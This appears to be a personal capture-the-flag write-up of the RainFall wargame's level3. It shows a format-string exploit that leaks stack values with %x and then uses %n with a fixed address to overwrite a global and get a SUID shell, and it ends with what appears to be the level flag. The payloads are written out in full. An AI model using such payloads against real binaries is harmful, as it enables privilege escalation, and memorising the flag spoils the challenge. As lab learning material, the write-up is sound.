In this file we can see that our bash execution is only behind a single condition check

There may be other ways to do it, but we can simply use gdb to go untill the condition and set the register manually

Uh nervermind, it seems that we loose suid thanks to GDB

Turns out the comparaison is carried on a global variable, that can be found at address 0x804988c

https://cs.boisestate.edu/~jhyeh/cs546/Format-String-Lecture.pdf

Ok but what now ?

What if there is more % than there is arguments ?

```
level3@RainFall:~$ ./level3
%x %x %x %x %x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078
```
Ok so we do get some values
```
level3@RainFall:~$ ./level3
AAAA %x AAAA %x AAAA %x AAAA %x AAAA %x AAAA %x
AAAA 200 AAAA b7fd1ac0 AAAA b7ff37d0 AAAA 41414141 AAAA 20782520 AAAA �41414141
```

We can see that we find the 41 value wich is our A, interesting

```
level3@RainFall:~$ ./level3
AAAA %x AAAA %x AAAA %x AAAA %x AAAA %x AAAA %x
AAAA 200 AAAA b7fd1ac0 AAAA b7ff37d0 AAAA 41414141 AAAA 20782520 AAAA �41414141
```


``` 
level3@RainFall:~$ ./level3
AAAA %x %x %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825
``` 

Ok so it seems that the fourth arguments that printf takes is the string itself, we may be able to do something about it 

Lets try printing our value

\x8c\x98\x04\x08 %x %x %x %s

yeah we get a segault because there is probably no null termination

Turns out we can write to a pointer using the %n modifier, %n writes to a pointed value the number of chars it has printed so far


level3@RainFall:~$ python -c 'print ("\x8c\x98\x04\x08" + "A" * 60 + "%c%c%c%n")' > /tmp/exploit2

Does not work because the chars are not printable is my guess

level3@RainFall:~$ python -c 'print ("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")' > /tmp/exploit2

Does work however cuz we select the fourth argument directly

We can also use below and make use of the padding for the ammount of chars we want

level3@RainFall:~$ python -c 'print ("\x8c\x98\x04\x08" + "%60d%4$n")' > /tmp/exploit2

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa